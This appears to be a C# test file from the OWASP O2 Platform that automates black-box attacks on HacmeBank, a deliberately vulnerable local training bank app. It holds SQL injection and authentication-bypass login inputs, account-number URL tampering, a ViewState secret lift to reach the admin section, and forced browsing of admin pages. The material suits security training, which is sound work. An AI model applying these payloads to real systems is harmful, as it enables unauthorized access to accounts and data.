// This file is part of the OWASP O2 Platform (http://www.owasp.org/index.php/OWASP_O2_Platform) and is released under the Apache 2.0 License (http://www.apache.org/licenses/LICENSE-2.0)
using System;
using System.Windows.Forms;
using FluentSharp.CoreLib;
using FluentSharp.REPL;
using FluentSharp.Watin;
using FluentSharp.WinForms;
using FluentSharp.WinForms.Controls;
using O2.XRules.Database.Languages_and_Frameworks.DotNet;
using NUnit.Framework;

//O2Ref:Interop.SHDocVw.dll
//O2File:DotNet_ViewState.cs
//O2File:MS_VS_WebServer.cs
//O2Ref:Microsoft.mshtml.dll
//O2Ref:NUnit.Framework.dll
//O2Ref:System.Xaml.dll
//O2Ref:FluentSharp.WatiN.dll
//O2Ref:WatiN.Core.dll


namespace O2.XRules.Database.HacmeBank
{	
	[TestFixture]
    public partial class HacmeBank_BlackBox_Exploits
    {   
    	private string StartUrl {get; set;}
    	private WatiN_IE Browser {get; set;}
    	
    	private Control GuiControl {get; set;}    	
    	    
    	public  HacmeBank_BlackBox_Exploits(Control guiControl, string startUrl)
    	{
    		GuiControl = guiControl;
    		StartUrl = startUrl;    		
    	}
    	
    	public static void launchGui()
    	{
    		launchExploitExecutionEnvironemnt(); 
    	}
    	
    	public void launch_HacmeBank() 
    	{
    		"in launch_HacmeBank".info();
    		var baseDir = @"C:\_WorkDir\Git_O2OPlatform\Demos_Files\HacmeBank_v2.0 (7 Dec 08)";
    		var webServices = baseDir.pathCombine("HacmeBank_v2_WS"); 
    		
    		var webSite = baseDir.pathCombine("HacmeBank_v2_Website");
    		var webServicesPort = 15583;
    		var webSitePort = 11112;
    		StartUrl = "http://127.0.0.1:{0}/HacmeBank_v2_Website".format(webSitePort);
    		//MS_VS_WebServer.stopCurrentWebServerProcesses();
    		
    		webServices.startWebServer(webServicesPort,"/HacmeBank_v2_WS");
    		webSite.startWebServer(webSitePort,"/HacmeBank_v2_Website");
    		open_HacmeBank_login_page();
    	}
    	
    	public void stop_WebServers()
    	{
    		MS_VS_WebServer.stopCurrentWebServerProcesses();
    	}
    		
    	
    	private void open_HacmeBank_login_page()
    	{
    		setup();    		
    		Browser.open(StartUrl);    	    		
    	}
    	
    	[Test]
    	public void login_Fail()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("Not Good").flash();
			Browser.field("txtPassword").value("BBBB").flash();
			Browser.button("Submit").flash().click();
		}
		
		[Test]
		public void login_as_JV()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
		}
		
		[Test]
		public void vulnerability_Sql_Injection_in_Login_page()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv ' aaa").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
		}
		
		[Test]
		public void vulnerability_Sql_Injection_in_Accounts_Details_page()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").flash().click();
			Browser.link("My Accounts").flash().click(); 
			Browser.link("View Transactions").flash().click();  
			Browser.open(Browser.url()+"' AAAAA "); 			
		}				
    	
    	[Test]
    	public void vulnerability_Autorization_Bypass_in_Login_page()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv'-- asdasd").flash();
			Browser.field("txtPassword").value("aaaa").flash();
			Browser.button("Submit").flash().click();
		} 
		[Test]
		public void vulnerability_Authentication_Failure_in_Accounts_Details_page()
		{	
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").click();
			Browser.link("My Accounts").flash().click(); 
			Browser.link("View Transactions").flash().click();
			Browser.sleep(1000);
			var url = Browser.url();
			var payload = url.replace("5204320422040001","5204320422040003");
			Browser.open(payload);			
		}
		[Test]
		public void vulnerability_Sensitive_Information_Disclosure_in_Admin_Section()
		{
			setup();  
			Browser.open(StartUrl);  
			Browser.field("txtUserName").value("jv").flash();
			Browser.field("txtPassword").value("jv789").flash();
			Browser.button("Submit").click();
			Browser.link("Admin Section").flash().click(); 					
			
			var response = Browser.viewState().ViewState_Values[12];
			
			Browser.field("_ctl3:txtResponse").value(response).flash();			
			Browser.button("Login").flash().click();
		}
		
		[Test]
		public void vulnerability_Autorization_Failure_on_Admin_Controls()
		{
			setup();
			vulnerability_Sensitive_Information_Disclosure_in_Admin_Section();
			
			var adminPages = Browser.links().urls().filter("admin");
			
			Browser.link("Logout").click(); 
			
			login_as_JV();
			
			foreach(var page in adminPages)
			{
				Browser.open(page);
				Browser.sleep(2000);
			}
		}
    }
    
    public partial class HacmeBank_BlackBox_Exploits
	{
		public static void launchExploitExecutionEnvironemnt()
		{
			"in launchExploitExecutionEnvironemnt".debug();
			var h2Script = "BlackBox - Exploit Execution.h2".local();
			var startUrl = "http://localhost:11112/HacmeBank_v2_Website";
			var hacmeBankExploits = @"HacmeBank_BlackBox_Exploits.cs.o2".local();
			
			var loadData = (Func<string, string, System.Windows.Forms.Form> )h2Script.executeH2Script();
			var form = loadData(hacmeBankExploits, startUrl);
			//topForm.top(100);
			//var topPanel = (Control)h2Script.executeH2Script();				
			form.width(800)
				.height(600)
				.top(0)
				.left(0);
			//var formControls = topPanel.controls(true); 
			
			//formControls.controls<TextBox>()[0].sendKeys("HacmeBank_BlackBox_Exploits.cs".local().line());
			//formControls.controls<TextBox>()[1].sendKeys("http://localhost:59584/HacmeBank_v2_Website".local().line());
			
			//formControls.controls<LinkLabel>()[2].click();
			//show.info(formControls.controls<LinkLabel>());	
		}
		
		private void setup()
    	{    		
    		if (GuiControl.notNull())    		
    		{
    			GuiControl.clear();    	   		    		
    			Browser = GuiControl.add_IE();
    			Browser.silent(true);
    		}
    		else
    		{
    			var panel = O2Gui.open<Panel>("WebGoat BlackBox Exploits - Execution window", 800,600);    			
				Browser = panel.add_IE();
				panel.parentForm()
				  .top(0)
				  .left(0);
    		}
			
    		//webGoat = new API_WebGoat(ie, pathToWebGoatInstallation);    		    		    			
    	}
    }
}
